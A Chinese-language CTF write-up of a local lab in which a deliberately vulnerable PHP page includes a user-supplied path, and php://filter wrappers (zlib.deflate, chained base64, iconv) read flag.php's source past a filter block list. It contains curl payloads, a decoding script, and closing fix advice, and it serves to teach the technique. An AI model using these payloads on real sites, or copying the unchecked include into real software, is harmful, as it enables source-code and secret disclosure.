---
title: "PHP 协议与编码压缩绕过"
slug: "ctf-php-filter-encoding-bypass"
date: 2026-09-02T19:23:38+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "php://filter 被拉黑后，用编码与压缩包装器继续读取源码。"
summary: "php://filter 被拉黑后，用编码与压缩包装器继续读取源码。"
tags: ["CTF", "PHP", "php://filter"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 15
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/15.PHP协议与编码 压缩绕过.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-php-filter-encoding-bypass/workflow.svg" alt="当 Base64 过滤器被禁用后，用压缩过滤器输出二进制，再离线还原源码。" loading="lazy">
  <figcaption>图 1 · php://filter 编码压缩绕过。当 Base64 过滤器被禁用后，用压缩过滤器输出二进制，再离线还原源码。</figcaption>
</figure>

## 1. 本地复现环境

创建目录：

```bash
mkdir -p /tmp/php-filter
cd /tmp/php-filter
```

创建 `flag.php`：

```php
<?php
$flag = 'flag{local_filter_demo}';
```

创建 `index.php`：

```php
<?php
$file = $_GET['file'] ?? '';
if ($file !== '') {
    include $file;
}
```

启动：

```bash
php -S 127.0.0.1:8080
```

## 2. 正常读取被过滤

尝试：

```bash
curl -sS --get \
  --data-urlencode 'file=php://filter/read=convert.base64-encode/resource=flag.php' \
  'http://127.0.0.1:8080/'
```

在题目中这个过滤器可能被 WAF 或正则拦截。

## 3. 改用压缩过滤器

```bash
curl -sS --get \
  --data-urlencode 'file=php://filter/read=zlib.deflate/resource=flag.php' \
  'http://127.0.0.1:8080/' \
  -o /tmp/flag.raw
```

`zlib.deflate` 输出的是 deflate 原始压缩流，不保证是可直接阅读的文本。

## 4. 完整解码脚本

```python
from pathlib import Path
import base64
import zlib

raw = Path("/tmp/flag.raw").read_bytes()

# 有些题目会把压缩流再做一层 Base64。
try:
    raw = base64.b64decode(raw, validate=False)
except Exception:
    pass

plain = zlib.decompress(raw, -15)
print(plain.decode("utf-8", errors="replace"))
```

保存并执行：

```bash
python3 decode_filter.py
```

预期输出：

```php
<?php
$flag = 'flag{local_filter_demo}';
```

## 5. 其他可用过滤器

```text
php://filter/read=string.toupper/resource=flag.php
php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
php://filter/read=convert.base64-decode/resource=flag.php
```

过滤器可以串联：

```text
php://filter/read=zlib.deflate|convert.base64-encode/resource=flag.php
```

串联后要按相反顺序还原：先 Base64 解码，再 zlib 解压。

## 6. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 响应是乱码 | 直接打开了压缩二进制 | 保存原始字节 |
| `zlib.error` | 不是 zlib 头/流不完整 | 用 `-15` 或检查是否先 Base64 |
| 过滤器无效 | PHP 未启用 zlib | `php -m` 查看模块 |
| 路径读不到 | 相对路径错误 | 先读 `index.php` 验证 |

## 7. 修复建议

- 禁止用户控制 `include` 路径；
- 使用固定文件白名单；
- 禁止 `php://`、`file://` 等包装器；
- 关闭不必要的过滤器模块；
- 对路径做规范化和根目录限制。
